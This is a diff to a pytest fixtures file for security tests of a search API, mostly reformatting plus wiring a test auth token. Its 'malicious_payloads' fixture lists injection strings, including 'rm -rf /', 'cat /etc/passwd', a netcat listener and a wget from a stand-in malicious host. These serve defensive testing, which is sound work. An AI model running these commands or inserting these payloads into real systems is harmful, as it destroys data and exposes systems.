@@ -2,24 +2,25 @@
 Shared fixtures and configuration for search security tests
 """
 
-import pytest
 import asyncio
-from unittest.mock import AsyncMock, Mock, patch
-from fastapi.testclient import TestClient
-from sqlalchemy.orm import Session
-from typing import Dict, Any, List, Generator
-import uuid
-import time
-from datetime import datetime, timedelta
 import json
-from httpx import AsyncClient
+import time
+import uuid
+from datetime import datetime, timedelta
+from typing import Any, Dict, Generator, List
+from unittest.mock import AsyncMock, Mock, patch
 
-from src.main import app
+import pytest
+from fastapi.testclient import TestClient
+from httpx import AsyncClient
+from sqlalchemy.orm import Session
+
 from src.core.database import get_db, get_db_sync
 from src.core.dependencies import get_current_user
-from src.models.user import User
+from src.main import app
 from src.models.organization import Organization
 from src.models.search_schemas import SearchQuery, SearchType
+from src.models.user import User
 
 
 class SecurityTestClient:
@@ -37,18 +38,22 @@ class SecurityTestClient:
         self.request_count += 1
         start_time = time.time()
 
-        prefixed_url = f"{self.API_PREFIX}{url}" if not url.startswith(self.API_PREFIX) else url
+        prefixed_url = (
+            f"{self.API_PREFIX}{url}" if not url.startswith(self.API_PREFIX) else url
+        )
         response = getattr(self.client, method.lower())(prefixed_url, **kwargs)
 
         end_time = time.time()
-        self.request_history.append({
-            'method': method,
-            'url': url,
-            'timestamp': start_time,
-            'response_time': end_time - start_time,
-            'status_code': response.status_code,
-            'kwargs': kwargs
-        })
+        self.request_history.append(
+            {
+                "method": method,
+                "url": url,
+                "timestamp": start_time,
+                "response_time": end_time - start_time,
+                "status_code": response.status_code,
+                "kwargs": kwargs,
+            }
+        )
 
         return response
 
@@ -80,7 +85,7 @@ def _make_mock_user():
 
 
 @pytest.fixture
-def security_test_client():
+def security_test_client(test_app, test_auth_headers):
     """Create enhanced test client for security testing.
 
     Overrides the ``get_current_user`` dependency so that requests using the
@@ -92,7 +97,11 @@ def security_test_client():
     mock_db = Mock(spec=Session)
     app.dependency_overrides[get_current_user] = lambda: mock_user
     app.dependency_overrides[get_db_sync] = lambda: mock_db
-    client = TestClient(app)
+    # PR #1722: the fail-closed tenancy middleware runs before any dependency
+    # override, so authenticated requests carry the token the ``test_app``
+    # middleware seam (tests/conftest.py) accepts. Explicit per-request
+    # headers (invalid/expired/malformed tokens) still override it.
+    client = TestClient(app, headers=test_auth_headers)
     yield SecurityTestClient(client)
     app.dependency_overrides.pop(get_current_user, None)
     app.dependency_overrides.pop(get_db_sync, None)
@@ -132,7 +141,7 @@ def test_user():
         is_active=True,
         is_verified=True,
         organization_id=uuid.uuid4(),
-        role="user"
+        role="user",
     )
 
 
@@ -146,37 +155,33 @@ def admin_user():
         is_active=True,
         is_verified=True,
         organization_id=uuid.uuid4(),
-        role="admin"
+        role="admin",
     )
 
 
 @pytest.fixture
 def test_organization():
     """Create a test organization"""
-    return Organization(
-        id=uuid.uuid4(),
-        name="Test Organization",
-        is_active=True
-    )
+    return Organization(id=uuid.uuid4(), name="Test Organization", is_active=True)
 
 
 @pytest.fixture
 def malicious_payloads():
     """Collection of malicious payloads for testing"""
     return {
-        'sql_injection': [
+        "sql_injection": [
             "'; DROP TABLE documents; --",
             "' OR '1'='1",
             "' UNION SELECT * FROM users --",
             "'; INSERT INTO documents VALUES('malicious'); --",
             "' OR 1=1; --",
-            "\"; DROP TABLE documents; --",
+            '"; DROP TABLE documents; --',
             "1' AND '1'='1",
             "admin'--",
             "1' OR '1'='1' /*",
-            "'; EXEC xp_cmdshell('dir'); --"
+            "'; EXEC xp_cmdshell('dir'); --",
         ],
-        'xss_payloads': [
+        "xss_payloads": [
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "javascript:alert('XSS')",
@@ -188,9 +193,9 @@ def malicious_payloads():
             "<textarea onfocus=alert('XSS') autofocus>",
             "'>alert('XSS')<'",
             "\"><script>alert('XSS')</script>",
-            "<script>document.cookie='stolen'</script>"
+            "<script>document.cookie='stolen'</script>",
         ],
-        'command_injection': [
+        "command_injection": [
             "; ls -la",
             "| cat /etc/passwd",
             "&& rm -rf /",
@@ -200,23 +205,18 @@ def malicious_payloads():
             "${USER}",
             "|nc -l 4444",
             "; python -c 'import os; os.system(\"rm -rf /\")'",
-            "&& wget http://malicious.com/script.sh"
+            "&& wget http://malicious.com/script.sh",
         ],
-        'path_traversal': [
+        "path_traversal": [
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
             "....//....//....//etc/passwd",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
             "..%252f..%252f..%252fetc%252fpasswd",
-            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
         ],
-        'buffer_overflow': [
-            "A" * 10000,
-            "A" * 100000,
-            "\x00" * 1000,
-            "\xff" * 1000
-        ],
-        'unicode_attacks': [
+        "buffer_overflow": ["A" * 10000, "A" * 100000, "\x00" * 1000, "\xff" * 1000],
+        "unicode_attacks": [
             "\u202e",  # Right-to-left override
             "\u2066",  # Left-to-right isolate
             "\u2067",  # Right-to-left isolate
@@ -224,11 +224,11 @@ def malicious_payloads():
             "\u200d",  # Zero width joiner
             "\u200c",  # Zero width non-joiner
         ],
-        'null_byte_injection': [
+        "null_byte_injection": [
             "test\x00.txt",
             "search\x00'; DROP TABLE documents; --",
-            "query\x00<script>alert('xss')</script>"
-        ]
+            "query\x00<script>alert('xss')</script>",
+        ],
     }
 
 
@@ -246,18 +246,21 @@ def valid_search_payloads():
 
 
 @pytest.fixture
-def authentication_headers():
+def authentication_headers(test_auth_headers):
     """Generate various authentication headers for testing"""
     return {
-        'valid_jwt': {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.valid_token'},
-        'invalid_jwt': {'Authorization': 'Bearer invalid_token'},
-        'malformed_jwt': {'Authorization': 'Bearer not.a.jwt'},
-        'expired_jwt': {'Authorization': 'Bearer expired_token'},
-        'missing_bearer': {'Authorization': 'invalid_token'},
+        # The token the tenancy-gate test seam accepts (PR #1722).
+        "valid_jwt": dict(test_auth_headers),
+        "invalid_jwt": {"Authorization": "Bearer invalid_token"},
+        "malformed_jwt": {"Authorization": "Bearer not.a.jwt"},
+        "expired_jwt": {"Authorization": "Bearer expired_token"},
+        "missing_bearer": {"Authorization": "invalid_token"},
+        # fmt: off
         'valid_api_key': {'X-API-Key': 'valid_api_key_12345'},
         'invalid_api_key': {'X-API-Key': 'invalid_key'},
-        'empty_auth': {'Authorization': ''},
-        'no_auth': {}
+        # fmt: on
+        "empty_auth": {"Authorization": ""},
+        "no_auth": {},
     }
 
 
@@ -274,7 +277,7 @@ async def rate_limiter_mock():
 @pytest.fixture
 def security_logger_mock():
     """Mock security logger for testing log events"""
-    with patch('src.core.security_logger') as mock_logger:
+    with patch("src.core.security_logger") as mock_logger:
         mock_logger.log_security_event = Mock()
         mock_logger.log_suspicious_activity = Mock()
         mock_logger.log_authentication_failure = Mock()
@@ -283,7 +286,8 @@ def security_logger_mock():
 
 def _make_mock_search_response():
     """Create a SearchResponse-compatible object for mocked search services."""
-    from src.models.search_schemas import SearchResponse, SearchType as ST
+    from src.models.search_schemas import SearchResponse
+    from src.models.search_schemas import SearchType as ST
 
     return SearchResponse(
         query="test",
@@ -306,16 +310,19 @@ def search_service_mocks():
     """Mock all search services to isolate endpoint testing"""
     mocks = {}
 
-    with patch('src.api.search.search.hybrid_search_service') as hybrid_mock:
-        with patch('src.api.search.search.fulltext_search_service') as fulltext_mock:
+    with patch("src.api.search.search.hybrid_search_service") as hybrid_mock:
+        with patch("src.api.search.search.fulltext_search_service") as fulltext_mock:
             mock_response = _make_mock_search_response()
 
             hybrid_mock.search.return_value = mock_response
             fulltext_mock.search.return_value = mock_response
-            fulltext_mock._get_search_suggestions.return_value = ['suggestion1', 'suggestion2']
+            fulltext_mock._get_search_suggestions.return_value = [
+                "suggestion1",
+                "suggestion2",
+            ]
 
-            mocks['hybrid'] = hybrid_mock
-            mocks['fulltext'] = fulltext_mock
+            mocks["hybrid"] = hybrid_mock
+            mocks["fulltext"] = fulltext_mock
 
             yield mocks
 
@@ -358,7 +365,9 @@ class SecurityTestCase:
         """Assert response doesn't disclose sensitive information"""
         response_text = response.text.lower()
         for pattern in sensitive_patterns:
-            assert pattern.lower() not in response_text, f"Sensitive information disclosed: {pattern}"
+            assert (
+                pattern.lower() not in response_text
+            ), f"Sensitive information disclosed: {pattern}"
 
     def assert_no_server_info_disclosure(self, response):
         """Assert response doesn't disclose server internals.
@@ -370,19 +379,19 @@ class SecurityTestCase:
         ``password``, ``hacked``).
         """
         sensitive_patterns = [
-            'traceback',
-            'stack trace',
-            '/src/',
-            'file path',
+            "traceback",
+            "stack trace",
+            "/src/",
+            "file path",
         ]
         self.assert_no_information_disclosure(response, sensitive_patterns)
 
     def assert_security_headers(self, response):
         """Assert security headers are present"""
         security_headers = [
-            'x-content-type-options',
-            'x-frame-options',
-            'x-xss-protection'
+            "x-content-type-options",
+            "x-frame-options",
+            "x-xss-protection",
         ]
 
         for header in security_headers:
@@ -410,11 +419,11 @@ class SecurityTestCase:
 
         # Only check patterns that indicate real server-side disclosure.
         sensitive_patterns = [
-            'database',
-            'stack trace',
-            'traceback',
-            'file path',
-            '/src/',
+            "database",
+            "stack trace",
+            "traceback",
+            "file path",
+            "/src/",
         ]
 
         self.assert_no_information_disclosure(response, sensitive_patterns)
